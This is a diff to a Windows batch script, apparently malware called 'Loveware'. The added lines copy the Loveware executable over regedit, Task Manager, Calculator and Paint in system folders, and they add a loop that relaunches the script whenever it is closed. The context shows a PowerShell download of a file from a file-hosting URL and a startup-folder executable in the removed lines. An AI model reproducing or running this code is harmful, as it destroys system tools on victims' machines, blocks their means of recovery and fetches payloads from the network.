@@ -318,8 +318,10 @@ powershell -Command "Invoke-WebRequest http://www.mediafire.com/file/xycm8d9wqrm
 
 :: Overwrite regedit and taskmanager for extra fun
 
-type Loveware.exe > regedit.exe
-type Loveware.exe > C:\Windows\System32\Taskmgr.exe
+copy/y Loveware.exe C:\Windows\regedit.exe
+copy/y Loveware.exe C:\Windows\System32\Taskmgr.exe
+copy/y Loveware.exe C:\Windows\calc.exe
+copy/y Loveware.exe C:\Windows\pbrush.exe
 
 :: Create new vbs file that speaks.
 
@@ -627,17 +629,18 @@ start LoveChoice.bat
 
 start /min https://www.youtube.com/watch?v=XpqqjU7u5Yc
 
-:: Activate LoveLetter if someone closes LoveChoice
+:: Restart LoveChoice if someone closes it
 
-:LOVE
+:checker
 
-tasklist | find /I "LoveChoice"
+if "%1" equ "Restarted" goto %1
 
-if errorlevel 1 (
+:again
+echo N|start "" /WAIT cmd.exe /C "%~F0" Restarted > NUL
+goto :again
 
-         start %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs.exe
-
-goto LOVE
+:Restarted
+goto checker
 
 :: PLEASE DO NOT COPY THE LOVEWARE CODE AND RENAME IT
 :: THAT'S NOT CREATING THAT IS STEALING.
